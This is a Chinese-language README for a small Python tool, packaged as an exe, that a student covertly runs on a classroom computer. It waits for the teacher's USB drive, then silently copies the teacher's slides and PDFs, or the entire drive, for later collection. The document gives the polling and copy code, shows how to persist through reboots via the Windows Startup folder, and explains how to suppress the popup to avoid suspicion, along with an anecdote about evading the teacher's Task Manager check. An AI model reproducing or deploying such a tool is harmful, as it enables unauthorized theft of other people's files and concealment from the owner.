# 免责声明:(开发者甩锅协议)

* 本项目仅仅可以学习研究，请自觉遵守道德底线和相关法律法规。
* 如果有人把自己玩进去了，那是它坏，与我无关。
* 如果出现被请去喝茶等严重后果，概不负责。
* 知识没有好坏，但运用知识的人有好坏。
* 如有需要，联系"骑马拿剑的小机务"：307191019 (WeChat or QQ)

## 有问题可以提出issue与我🤺

---

* 一般情况:

        在目标人物到达目标电脑之前，你飞快地在目标电脑上启动打包好的exe程序，并且关闭弹窗提示，然后飞快的回到你的座位上，好好上课，静静的等待下课。
        待目标人物走后，你大可慢悠悠的上去拿走你要的东西哦。

* 如果你的目标人物有每次使用有重启的习惯，那么你需要如下步骤

        启动系统运行路径后，在该路径下创建exe程序的快捷方式。

---

## 好了，哑谜结束

总有些老师不给他上课用的屁屁踢，导致我无法安抚我躁动的想要学习的心。于是出此下策，背着老师拿走他的可能是课件的东西。

## 以下为简要说明

* 弹窗提示：程序运行后会有一个已启动的小弹窗，如果是你手动启动的程序，那么你将其关闭即可。如果为开机自启，这可能会引起老师怀疑，如果你觉得不妥，可以在代码中将此段注释掉。

        #程序启动提示
        root = tkinter.Tk()
        root.minsize(300,300)
        root.title("已启动")
        root.mainloop()

* 相关路径：假设教室的多媒体设备有两个盘C和D，那么老师U盘插入后为E盘。file_path代表老师的U盘。save_path默认为教室多媒体设备的D盘(一般教室的多媒体设备D盘每次重启后不会恢复初始状态)，复制后的课件会保存在D盘根目录下的 knowledge 文件夹。
  * 如果你有其他情况，请自行更改相关路径。

        # 要复制的目录，老师的U盘
        file_path = r'E:/'
        # 指定保存目录，我的U盘
        save_path = r'D:/knowledge/'

* format_name为想要的文件格式，一般老师课件的格式就是ppt，pptx或pdf，如果你有特殊需求，在代码中额外添加即可。

        # 指定文件格式
        format_name = ['.ppt','pptx','pdf']

---

* 如果你的老师每次上课前有重启电脑的好习惯，那么你需要一点额外的步骤。

        启动系统启动路径，在该路径下创建exe程序的快捷方式。

  * 系统启动路径:

        一般为: C:\Users\系统用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

        也可:Win+R启动运行窗口，输入 shell:startup 后确定，弹出系统运行路径。

* 此步骤仅针对重启后C盘不会重置的设备，如果重启后C盘会被重置为初始状态，那么此步骤无用。也没有其他好办法，你只能和老师斗智斗勇。

  * 一般这种设备的 启动路径下都有一个 clear desk.bat 的脚本，我将其中代码列入 clear desk.txt 中，将txt格式修改为bat格式后，可以运行重置C盘的操作。
  * 告诫：不要在自己的实体机上运行。

---

* 妙啊：这个两次插入的判断，我自己都觉得妙！

  * 看你具体需求，如果你想等老师稳定上课后再复制文件，那么将第一次插入后的暂停时间延长，至你想要的时间。

        if __name__ == '__main__':
            while True:
                # 判断老师U盘是否插入，
                if os. path.exists(file_path):
            
                    sleep(10)#如果插入，暂停10秒再判断一次，防止老师U盘没插牢
                    if os. path.exists(file_path):
                        # 两次判断插入后，开始复制指定格式文件
                        for i in format_name:
                            copy_file(i)
                        break   # 复制完后终止程序

                else:
                    sleep(10)    # 未插入U盘，一直运行，每10秒检测一次

  * 只运行代码中此段，应该是会复制U盘中的所有文件。

        # 不管不顾，运行此段，直接复制所有文件
        while (True): 
        if os. path.exists(file_path):
                shutil.copytree(file_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d %H%M%S")))
                break
        else:
                time.sleep(10)

---

### 写在最后

* 终究还是一时兴起做的小玩意儿，没多么严谨，dist文件夹下的 get_PPT.exe 是已经打包好的程序。
* 只因老师不给我屁屁踢。课前点开了程序，老师插入U盘后，打不开文件，我的老师迟疑了一下，然后就调出了任务管理器，说实话，那一瞬间我有点慌，得亏我这个占用极低，很不起眼，然后电脑就被老师重启了。 我老师反应是真的快，如果重启电脑的手再快一点，我的屁屁踢就拿不到了。
* 哎，建议对理工科的老师还是慎用，……
